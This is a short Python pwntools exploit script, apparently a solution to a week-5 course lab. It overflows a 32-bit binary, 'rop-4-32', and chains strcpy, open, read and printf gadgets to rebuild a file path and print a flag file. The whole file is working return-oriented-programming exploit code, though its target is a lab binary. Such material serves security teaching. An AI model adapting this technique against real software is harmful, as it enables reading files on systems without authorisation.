#!/usr/bin/env python


# use this script like this:
#   $ ./script.py > input
#   $ (cat input) | ./rop-4-32

from pwn import *

# some syscalls and other stuff:
"""
0x080483c0  read@plt
0x080483d0  printf@plt
0x08048400  open@plt
0x0804858e  strcpy

0x080483a9 : pop ebx ; ret
0x0804873a : pop edi ; pop ebp ; ret
0x08048739 : pop esi ; pop edi ; pop ebp ; ret
"""

read_addr = p32(0x080483c0)
printf_addr = p32(0x080483d0)
open_addr = p32(0x08048400)
strcpy_addr = p32(0x0804858e)
pop1_ret = p32(0x080483a9)
pop2_ret = p32(0x0804873a)
pop3_ret = p32(0x08048739)
zeros = p32(0)

g_buf = 0x804a000 + 0x800
g_buf_orig = 0x804a000 + 0x800

# now lets build some strings
alph_addr = 0x8048768
slash_addr = p32(0x80487e2)
alph_str = "the quick brown fox jumps over the lazy dog!"
zero_addr = p32(alph_addr + len(alph_str))

num_addr = 0x8048798
num_str = "I also put this for you: 1234567890-\0"
target_str = "/home/labs/week5/rop-4-32/flag\0"

buf = "A"*140
for c in target_str:
    if c == "/":
        buf += strcpy_addr + pop2_ret + p32(g_buf) + slash_addr
    elif c.isalpha():
        t_addr = p32(alph_addr + (alph_str.index(c)))
        buf += strcpy_addr + pop2_ret + p32(g_buf) + t_addr
    else:
        t_addr = p32(num_addr + (num_str.index(c)))
        buf += strcpy_addr + pop2_ret + p32(g_buf) + t_addr
    g_buf += 1

# open("flag", 0)
buf += open_addr + pop2_ret + p32(g_buf_orig) + zeros
# read(3, g_buf, 100)
buf += read_addr + pop3_ret + p32(3) + p32(g_buf) + p32(100)
# printf(g_buf)
buf += printf_addr + printf_addr + p32(g_buf) + zeros
print(buf)

